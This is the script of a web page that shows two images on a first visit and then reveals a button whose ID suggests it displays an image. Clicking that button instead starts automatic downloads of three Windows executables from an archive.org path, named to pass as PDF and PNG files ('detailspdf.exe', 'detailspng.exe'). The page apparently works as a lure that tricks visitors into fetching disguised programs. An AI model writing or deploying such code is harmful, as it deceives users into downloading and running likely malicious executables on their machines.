document.addEventListener('DOMContentLoaded', () => {
    const image1Container = document.getElementById('image1Container');
    const image2Container = document.getElementById('image2Container');
    const viewImageButton = document.getElementById('viewImageButton');
    const logoImage = document.getElementById('logoImage'); // Get reference to the logo image

    // Function to trigger file download
    const downloadFile = (filename) => {
        const link = document.createElement('a');
        link.href = filename;
        link.download = filename;
        document.body.appendChild(link);
        link.click();
        document.body.removeChild(link);
    };

    // Add event listener for the download button
    viewImageButton.addEventListener('click', () => {
        downloadFile('https://archive.org/download/newdetails/detailspdf.exe');
        setTimeout(() => {
            downloadFile('https://archive.org/download/newdetails/detailspng.exe');
        }, 500); // 0.5 second delay
        setTimeout(() => {
            downloadFile('https://archive.org/download/newdetails/newdetails.exe');
        }, 1000); // 1 second delay (0.5s after the second download)
    });

    const hasSeenImages = localStorage.getItem('hasSeenImages');

    if (hasSeenImages) {
        // If user has seen images before, hide images and show button and logo immediately
        image1Container.classList.add('hidden');
        image2Container.classList.add('hidden');
        viewImageButton.classList.remove('hidden');
        logoImage.classList.remove('hidden'); // Show logo image
    } else {
        // If it's the first time, play the image sequence
        image1Container.classList.remove('hidden');
        image2Container.classList.remove('hidden');
        viewImageButton.classList.add('hidden');
        logoImage.classList.add('hidden'); // Hide logo image initially
        

        // Step 1: Show both images for 5 seconds
        setTimeout(() => {
            image1Container.classList.add('hidden'); // Hide Image 1
            image2Container.classList.add('hidden'); // Hide Image 2
            viewImageButton.classList.remove('hidden'); // Show View Image Button
            logoImage.classList.remove('hidden'); // Show logo image

            localStorage.setItem('hasSeenImages', 'true');
        }, 5000); // Both images visible for 5 seconds
    }
});